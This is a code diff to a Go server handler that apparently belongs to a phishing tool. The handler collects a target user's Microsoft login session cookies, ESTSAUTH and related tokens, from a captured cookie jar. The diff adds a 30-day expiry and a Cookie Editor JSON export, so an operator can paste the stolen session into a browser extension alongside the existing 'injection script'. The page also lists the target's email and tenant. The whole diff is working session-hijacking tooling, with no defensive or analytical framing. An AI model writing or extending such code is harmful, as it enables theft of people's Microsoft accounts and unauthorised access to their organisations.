@@ -1465,19 +1465,24 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 	allCookies := jar.Cookies(msLoginURL)
 
 	type cookieEntry struct {
-		Name     string `json:"name"`
-		Value    string `json:"value"`
-		Domain   string `json:"domain"`
-		Path     string `json:"path"`
-		Secure   bool   `json:"secure"`
-		HTTPOnly bool   `json:"httpOnly"`
+		Name           string  `json:"name"`
+		Value          string  `json:"value"`
+		Domain         string  `json:"domain"`
+		Path           string  `json:"path"`
+		Secure         bool    `json:"secure"`
+		HTTPOnly       bool    `json:"httpOnly"`
+		ExpirationDate float64 `json:"expirationDate,omitempty"`
 	}
+
+	// 30-day expiry expressed as Unix timestamp (matches Cookie Editor format)
+	expiry := float64(time.Now().Add(30 * 24 * time.Hour).Unix())
 
 	var entries []cookieEntry
 	wantNames := map[string]bool{
 		"ESTSAUTH":           true,
 		"ESTSAUTHPERSISTENT": true,
 		"ESTSAUTHLIGHT":      true,
+		"SignInStateCookie":  true,
 		"buid":               true,
 		"esctx":              true,
 		"fpc":                true,
@@ -1485,15 +1490,19 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 	for _, c := range allCookies {
 		if wantNames[c.Name] {
 			entries = append(entries, cookieEntry{
-				Name:     c.Name,
-				Value:    c.Value,
-				Domain:   ".login.microsoftonline.com",
-				Path:     "/",
-				Secure:   true,
-				HTTPOnly: true,
+				Name:           c.Name,
+				Value:          c.Value,
+				Domain:         ".login.microsoftonline.com",
+				Path:           "/",
+				Secure:         true,
+				HTTPOnly:       true,
+				ExpirationDate: expiry,
 			})
 		}
 	}
+
+	// Cookie Editor JSON format (for browser extension import)
+	cookieEditorJSON, _ := json.MarshalIndent(entries, "", "  ")
 
 	// Build injection script matching user's reference format
 	cookieJSON, _ := json.Marshal(entries)
@@ -1571,6 +1580,15 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 </div>
 <p class="note">If copy fails: click inside the box, press Ctrl+A then Ctrl+C</p>
 </div>
+<div class="card">
+<h2>Cookie Editor JSON <span style="font-size:10px;color:#555;text-transform:none;letter-spacing:0">(import via Cookie Editor browser extension)</span></h2>
+<textarea class="code" id="tej" readonly style="height:160px">%s</textarea>
+<div class="row">
+<button class="btn" onclick="doCopyJson()">Copy for Cookie Editor</button>
+<span class="ok" id="okj">Copied!</span>
+</div>
+<p class="note">Install the <strong>Cookie Editor</strong> extension → open it on login.microsoftonline.com → Import tab → paste JSON</p>
+</div>
 <div class="card" style="font-size:12px;color:#555;line-height:1.9">
   <div>Target: <span style="color:#888">%s</span></div>
   <div>Tenant: <span style="color:#888">%s</span></div>
@@ -1578,7 +1596,9 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 </div>
 <script>
 var snippet=%s;
+var jsonSnippet=%s;
 var ta=document.getElementById('ta');
+var tej=document.getElementById('tej');
 function doCopy(){
   if(navigator.clipboard&&navigator.clipboard.writeText){
     navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
@@ -1589,8 +1609,20 @@ function legacyCopy(){
   try{if(document.execCommand('copy'))showOk();}catch(e){}
 }
 function showOk(){var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
+function doCopyJson(){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(jsonSnippet).then(showOkJson).catch(legacyCopyJson);
+  } else { legacyCopyJson(); }
+}
+function legacyCopyJson(){
+  tej.select();tej.setSelectionRange(0,99999);
+  try{if(document.execCommand('copy'))showOkJson();}catch(e){}
+}
+function showOkJson(){var o=document.getElementById('okj');o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
 ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
 ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
+tej.addEventListener('click',function(){tej.select();tej.setSelectionRange(0,99999);});
+tej.addEventListener('focus',function(){tej.select();tej.setSelectionRange(0,99999);});
 </script>
 </body></html>`,
 		template.HTMLEscapeString(email),
@@ -1599,10 +1631,12 @@ ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999)
 		statusNote,
 		template.HTMLEscapeString(email),
 		template.HTMLEscapeString(script),
+		template.HTMLEscapeString(string(cookieEditorJSON)),
 		template.HTMLEscapeString(email),
 		template.HTMLEscapeString(tenant),
 		len(entries),
 		string(scriptJSON),
+		string(func() []byte { b, _ := json.Marshal(string(cookieEditorJSON)); return b }()),
 	)
 }
 
